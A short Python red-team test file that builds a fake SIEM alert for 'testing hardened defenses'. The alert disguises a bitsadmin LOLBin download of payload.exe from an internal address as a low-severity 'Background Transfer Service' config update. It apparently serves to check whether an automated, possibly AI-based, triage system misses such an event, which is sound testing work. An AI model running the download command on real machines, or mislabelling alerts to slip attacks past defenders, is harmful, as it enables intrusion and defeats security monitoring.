"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 8: bitsadmin transfer LOLBin + phantom IPs
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Background Transfer Service",
            "source_ip": "203.0.113.88",
            "destination_ip": "198.51.100.99",
            "username": "svc_monitor",
            "hostname": "ws-admin-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "EventID=4688 Process=bitsadmin.exe "
                "CommandLine='bitsadmin /transfer myDownloadJob "
                "/download /priority normal http://10.0.1.100/payload.exe "
                "C:\\temp\\payload.exe' User=admin PID=5679"
            ),
        },
    }
